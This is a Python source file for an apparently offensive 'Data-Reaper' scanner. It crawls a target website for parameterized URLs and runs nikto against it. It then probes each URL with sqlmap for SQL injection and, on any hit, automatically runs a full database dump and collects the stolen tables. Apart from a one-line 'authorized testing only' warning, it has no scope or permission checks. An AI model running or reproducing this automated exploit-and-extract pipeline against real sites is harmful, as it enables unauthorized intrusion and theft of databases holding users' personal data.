#!/usr/bin/env python3
"""
Core Audit Engine — Data-Reaper Autonomous Scanner
Pipeline: Crawl → Detect → Exploit → Extract
WARNING: For authorized security testing only.
"""

import subprocess
import threading
import shutil
import time
import re
import os
import csv
import tempfile
import requests
from datetime import datetime
from urllib.parse import urljoin, urlparse


class AuditManager:
    """
    Fully autonomous web application scanner.
    Requires no manual URL parameters — discovers, tests, and dumps automatically.
    """

    def __init__(self):
        self.current_process = None
        self.output_buffer = []
        self.status = "IDLE"
        self.target_url = None
        self.start_time = None
        self.end_time = None
        self.lock = threading.Lock()
        self.output_lock = threading.Lock()
        self.discovered_lock = threading.Lock()
        self.vuln_lock = threading.Lock()
        self._stop_requested = False
        self.output_dir = None
        self.extracted_data = []
        self.discovered_urls = []
        self.vulnerable_urls = []

    def check_sqlmap(self):
        return shutil.which("sqlmap") is not None

    def check_tool(self, name):
        return shutil.which(name) is not None

    def _add_output(self, text, line_type='normal', stream='system'):
        """Thread-safe output logging to the live terminal buffer."""
        timestamp = datetime.now().strftime("%H:%M:%S")
        with self.output_lock:
            self.output_buffer.append({
                'timestamp': timestamp,
                'text': text,
                'type': line_type,
                'stream': stream
            })
            if len(self.output_buffer) > 1000:
                self.output_buffer = self.output_buffer[-1000:]

    def _parse_output_line(self, line):
        line = line.strip()
        if not line:
            return None, 'normal'

        ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
        clean_line = ansi_escape.sub('', line)
        lower_line = clean_line.lower()

        if any(kw in lower_line for kw in ['critical', 'unhandled exception', 'traceback']):
            return clean_line, 'critical'
        elif any(kw in lower_line for kw in ['error', 'failed', 'unable to']):
            return clean_line, 'error'
        elif any(kw in lower_line for kw in ['available databases', 'database:', 'table:', 'column:', 'dumped']):
            return clean_line, 'success'
        elif any(kw in lower_line for kw in ['warning', 'deprecated']):
            return clean_line, 'warning'
        elif any(kw in lower_line for kw in ['info', '[*]']):
            return clean_line, 'info'
        elif 'vulnerable' in lower_line and 'not' not in lower_line:
            return clean_line, 'success'
        elif 'not vulnerable' in lower_line:
            return clean_line, 'error'
        else:
            return clean_line, 'normal'

    def _update_status_from_output(self, line, line_type):
        lower_line = line.lower()
        with self.lock:
            if line_type == 'critical':
                self.status = "ERROR"
            elif 'available databases' in lower_line:
                self.status = "VULNERABLE"
            elif 'not vulnerable' in lower_line or 'not injectable' in lower_line:
                if self.status == "SCANNING":
                    self.status = "NOT_VULNERABLE"
            elif 'vulnerable' in lower_line and 'not' not in lower_line:
                self.status = "VULNERABLE"

    def _katana_crawl(self, target_url):
        """Crawl target with ProjectDiscovery Katana."""
        urls = []
        cmd = ["katana", "-u", target_url, "-d", "3", "-jc", "-silent"]
        self._add_output(f"[*] Deploying katana crawler: {' '.join(cmd)}", "info")

        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                bufsize=1,
                universal_newlines=False
            )
            self.current_process = proc

            for raw_line in iter(proc.stdout.readline, b''):
                if self._stop_requested:
                    proc.terminate()
                    break
                try:
                    line = raw_line.decode('utf-8', errors='replace').strip()
                except Exception:
                    continue
                if not line:
                    continue

                if '?' not in line:
                    continue

                skip_exts = ('.jpg', '.jpeg', '.png', '.gif', '.svg', '.css', '.js',
                            '.woff', '.woff2', '.ttf', '.eot', '.ico', '.pdf', '.zip',
                            '.mp4', '.mp3', '.avi', '.tar.gz', '.xml', '.json')
                if any(line.lower().endswith(ext) for ext in skip_exts):
                    continue

                if line not in urls:
                    urls.append(line)
                    with self.discovered_lock:
                        self.discovered_urls.append(line)
                    self._add_output(f"[+] Vector discovered: {line}", "success")

            proc.wait()

        except Exception as e:
            self._add_output(f"[!] Katana error: {str(e)}", "error")

        return urls

    def _python_crawl(self, target_url, max_depth=2, max_urls=50):
        """Fallback recursive crawler using Python requests."""
        self._add_output("[*] Katana unavailable. Activating Python fallback crawler...", "warning")
        discovered = []
        visited = set()
        queue = [(target_url, 0)]

        try:
            base_domain = urlparse(target_url).netloc
        except Exception:
            return discovered

        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
        }

        while queue and len(discovered) < max_urls:
            if self._stop_requested:
                break

            url, depth = queue.pop(0)
            if url in visited or depth > max_depth:
                continue
            visited.add(url)

            try:
                resp = requests.get(url, headers=headers, timeout=10, allow_redirects=True)
                if 'text/html' not in resp.headers.get('Content-Type', '').lower():
                    continue

                links = re.findall(r'href=["\'](.*?)["\']', resp.text)
                for link in links:
                    full = urljoin(url, link)
                    parsed = urlparse(full)

                    if parsed.netloc != base_domain:
                        continue

                    skip_exts = ('.jpg', '.jpeg', '.png', '.gif', '.svg', '.css', '.js',
                                '.woff', '.woff2', '.ttf', '.eot', '.ico', '.pdf', '.zip',
                                '.mp4', '.mp3', '.avi', '.xml', '.json')
                    if any(full.lower().endswith(ext) for ext in skip_exts):
                        continue

                    if '?' in full and full not in discovered:
                        discovered.append(full)
                        with self.discovered_lock:
                            self.discovered_urls.append(full)
                        self._add_output(f"[+] Vector discovered: {full}", "success")

                    if full not in visited:
                        queue.append((full, depth + 1))

            except Exception:
                continue

        return discovered

    def _crawl_target(self, target_url):
        """Phase 1: Discover all parameterized attack vectors."""
        self._add_output("[*] Phase 1: Reconnaissance — Initiating web crawl...", "info")

        if self.check_tool("katana"):
            urls = self._katana_crawl(target_url)
        else:
            self._add_output("[!] Install katana for superior crawling: go install github.com/projectdiscovery/katana/cmd/katana@latest", "warning")
            urls = self._python_crawl(target_url)

        self._add_output(f"[*] Reconnaissance complete. {len(urls)} parameterized vectors identified.", "info")
        return urls

    def _run_nikto(self, target_url):
        """Phase 1.5: Run nikto server misconfiguration scan in parallel."""
        if not self.check_tool("nikto"):
            self._add_output("[!] nikto not found. Install: sudo apt install nikto", "warning")
            return

        self._add_output("[*] Phase 1.5: Launching nikto server audit...", "info")
        cmd = ["nikto", "-h", target_url]

        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                bufsize=1,
                universal_newlines=False
            )

            for raw_line in iter(proc.stdout.readline, b''):
                if self._stop_requested:
                    proc.terminate()
                    break
                try:
                    line = raw_line.decode('utf-8', errors='replace').strip()
                except Exception:
                    continue
                if line:
                    self._add_output(f"[nikto] {line}", "warning")

            proc.wait()

        except Exception as e:
            self._add_output(f"[!] Nikto error: {str(e)}", "error")

    def _test_and_dump(self, url, current, total):
        """
        Phase 2 & 3: Test vector for SQL injection.
        If vulnerable, automatically proceed to --dump-all extraction.
        Returns True if vulnerability confirmed.
        """
        self._add_output(f"[*] Phase 2: Testing vector [{current}/{total}]", "info")
        self._add_output(f"[*] Target: {url}", "info")

        # Detection pass
        cmd = [
            "sqlmap",
            "-u", url,
            "--batch",
            "--level=3",
            "--risk=3",
            "--random-agent",
            "--color=off",
            "--flush-session",
            f"--output-dir={self.output_dir}"
        ]

        is_vuln = False

        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                bufsize=1,
                universal_newlines=False
            )
            self.current_process = proc

            for raw_line in iter(proc.stdout.readline, b''):
                if self._stop_requested:
                    proc.terminate()
                    break
                try:
                    line = raw_line.decode('utf-8', errors='replace').strip()
                except Exception:
                    continue
                if not line:
                    continue

                clean, ltype = self._parse_output_line(line)
                if clean:
                    self._add_output(clean, ltype)
                    self._update_status_from_output(clean, ltype)

                lower = line.lower()
                if 'is vulnerable' in lower and 'not' not in lower:
                    is_vuln = True
                elif 'available databases' in lower:
                    is_vuln = True

            proc.wait()

        except Exception as e:
            self._add_output(f"[!] sqlmap detection error: {str(e)}", "error")
            return False

        if self._stop_requested:
            return False

        if is_vuln:
            self._add_output("[!] VULNERABILITY CONFIRMED. Initiating automatic extraction...", "critical")
            self._add_output("[*] Phase 3: Deploying --dump-all payload...", "info")

            with self.vuln_lock:
                self.vulnerable_urls.append(url)
            with self.lock:
                self.status = "VULNERABLE"

            # Exploitation pass
            dump_cmd = [
                "sqlmap",
                "-u", url,
                "--batch",
                "--dump-all",
                "--threads=5",
                "--random-agent",
                "--color=off",
                f"--output-dir={self.output_dir}"
            ]

            try:
                proc = subprocess.Popen(
                    dump_cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    bufsize=1,
                    universal_newlines=False
                )
                self.current_process = proc

                for raw_line in iter(proc.stdout.readline, b''):
                    if self._stop_requested:
                        proc.terminate()
                        break
                    try:
                        line = raw_line.decode('utf-8', errors='replace').strip()
                    except Exception:
                        continue
                    if not line:
                        continue

                    clean, ltype = self._parse_output_line(line)
                    if clean:
                        self._add_output(clean, ltype)

                proc.wait()

                # Parse any new CSVs dumped
                new_data = self._parse_dumped_data()
                if new_data:
                    with self.lock:
                        self.extracted_data.extend(new_data)
                    self._add_output(f"[*] Extracted {len(new_data)} tables from {url}", "success")

            except Exception as e:
                self._add_output(f"[!] Dump failed: {str(e)}", "error")

            return True

        else:
            self._add_output(f"[*] Vector [{current}/{total}] is not vulnerable.", "info")
            return False

    def _parse_dumped_data(self):
        """
        Scan sqlmap output directory for dumped CSV files and parse into JSON.
        Returns: [{"table_name": "db.table", "rows": [{...}, ...]}, ...]
        """
        if not self.output_dir or not os.path.exists(self.output_dir):
            return []

        extracted = []

        try:
            for root, dirs, files in os.walk(self.output_dir):
                if os.path.basename(root) == "dump":
                    for db_name in dirs:
                        db_path = os.path.join(root, db_name)
                        if not os.path.isdir(db_path):
                            continue
                        for fname in os.listdir(db_path):
                            if fname.endswith('.csv'):
                                table_name = fname[:-4]
                                full_name = f"{db_name}.{table_name}"
                                csv_path = os.path.join(db_path, fname)
                                try:
                                    with open(csv_path, 'r', encoding='utf-8', errors='replace') as f:
                                        reader = csv.DictReader(f)
                                        rows = list(reader)
                                        if rows:
                                            existing = [d['table_name'] for d in self.extracted_data]
                                            if full_name not in existing:
                                                extracted.append({
                                                    "table_name": full_name,
                                                    "rows": rows
                                                })
                                except Exception:
                                    continue
                    dirs[:] = []
        except Exception as e:
            self._add_output(f"[!] Data parsing error: {str(e)}", "error")

        return extracted

    def _run_audit(self, target_url):
        """Main autonomous pipeline."""
        if not self.check_sqlmap():
            self._add_output("[!] ERROR: sqlmap not found in PATH. Install with: sudo apt install sqlmap", "critical")
            with self.lock:
                self.status = "ERROR"
            return

        self.output_dir = tempfile.mkdtemp(prefix="vulnaudit_")
        self._add_output(f"[*] Output directory: {self.output_dir}", "info")
        self._add_output(f"[*] Autonomous scan initiated against: {target_url}", "info")

        # Phase 1: Crawl
        discovered = self._crawl_target(target_url)
        if not discovered:
            self._add_output("[!] No parameterized URLs discovered. Target may be static or protected.", "warning")
            with self.lock:
                self.status = "NOT_VULNERABLE"
            self.end_time = datetime.now().isoformat()
            return

        # Limit to prevent freezing on massive sites
        max_test = 15
        if len(discovered) > max_test:
            self._add_output(f"[*] Limiting test scope to top {max_test} vectors to prevent system freeze.", "warning")
            discovered = discovered[:max_test]

        # Phase 1.5: Nikto in background
        nikto_thread = threading.Thread(target=self._run_nikto, args=(target_url,), daemon=True)
        nikto_thread.start()

        # Phase 2 & 3: Test and auto-dump each vector
        vuln_count = 0
        for idx, url in enumerate(discovered, 1):
            if self._stop_requested:
                self._add_output("[*] Abort signal received. Halting vector testing.", "warning")
                break

            if self._test_and_dump(url, idx, len(discovered)):
                vuln_count += 1

        nikto_thread.join(timeout=5)

        # Finalize
        with self.lock:
            if self._stop_requested:
                final_msg = "[*] Audit stopped by user."
            elif vuln_count > 0:
                if self.status not in ["ERROR"]:
                    self.status = "VULNERABLE"
                final_msg = f"[*] Audit complete. {vuln_count} vulnerable vector(s) found and exploited."
            elif self.status == "SCANNING":
                self.status = "NOT_VULNERABLE"
                final_msg = "[*] Audit complete. No vulnerabilities detected in tested vectors."
            else:
                final_msg = "[*] Audit finished."

        self._add_output(final_msg, "info")
        self.end_time = datetime.now().isoformat()
        self.current_process = None

    def start_audit(self, target_url):
        """Start a new autonomous audit session."""
        with self.lock:
            if self.status == "SCANNING":
                return {
                    'success': False,
                    'error': 'An audit is already running. Stop it first or wait for completion.'
                }

            self.status = "SCANNING"
            self.target_url = target_url
            self.start_time = datetime.now().isoformat()
            self.end_time = None
            self._stop_requested = False
            self.output_buffer = []
            self.extracted_data = []
            self.discovered_urls = []
            self.vulnerable_urls = []
            self.output_dir = None

        audit_thread = threading.Thread(
            target=self._run_audit,
            args=(target_url,),
            daemon=True
        )
        audit_thread.start()

        return {
            'success': True,
            'message': f'Autonomous audit started for {target_url}',
            'status': 'SCANNING'
        }

    def stop_audit(self):
        """Stop the currently running audit."""
        with self.lock:
            if self.status != "SCANNING":
                return {
                    'success': False,
                    'error': 'No audit is currently running.'
                }

            self._stop_requested = True

            try:
                if self.current_process:
                    self.current_process.terminate()
                    time.sleep(0.5)
                    if self.current_process and self.current_process.poll() is None:
                        self.current_process.kill()
            except Exception as e:
                return {
                    'success': False,
                    'error': f'Error stopping audit: {str(e)}'
                }

            self.status = "IDLE"
            self.end_time = datetime.now().isoformat()

            return {
                'success': True,
                'message': 'Audit stopped.'
            }

    def get_status(self):
        """Get current audit status, output buffer, discovered URLs, and extracted data."""
        with self.lock:
            status = self.status
            target = self.target_url
            start = self.start_time
            end = self.end_time
            extracted = list(self.extracted_data)

        with self.output_lock:
            output = list(self.output_buffer)

        with self.discovered_lock:
            discovered = list(self.discovered_urls)

        with self.vuln_lock:
            vulnerable = list(self.vulnerable_urls)

        return {
            'status': status,
            'target_url': target,
            'start_time': start,
            'end_time': end,
            'output': output,
            'extracted_data': extracted,
            'discovered_urls': discovered,
            'vulnerable_urls': vulnerable,
            'sqlmap_available': self.check_sqlmap()
        }